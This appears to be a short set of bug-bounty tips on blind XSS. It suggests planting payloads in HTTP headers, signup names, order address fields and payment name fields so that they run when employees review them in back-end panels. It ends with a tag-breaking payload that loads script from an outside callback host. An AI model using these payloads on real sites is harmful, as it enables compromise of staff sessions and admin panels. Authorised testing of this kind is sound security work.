--> Try Blind XSS injection into User-Agent or Referrer/Origin headers, in case that payloads seems not executed try again with url encoding or double encoding. Sometimes works like a charm! You never can't totally sure how the backend is handiling the inputs!

--> Signup with name as blind XSS payload. Report own profile to be reviewwd = blind xss executes when employee reviews it on backend.

-->If you are going to place an order to test out the flow for an e-commerce site, leave a BXSS payload in the 2nd line of your address field for a nice little surprise. Or the first name filed for any credit card payment.

-->User Agent: put blind xss payload in user agent before fill in a contact form


-->  if website allow to put blind xss payload in the form field try everywhere or the first name field for any credit card payment




Tip: When testing for Blind XSS I use the below payload: ``'"></title></textarea></script></style></noscript><script src=[https://abc.xss.ht](https://t.co/g8l6lbzBkO)></script> Here </title>`` closed the title tag and XSS was executed in Admin Panel. So make sure you use the above tags with your payload.
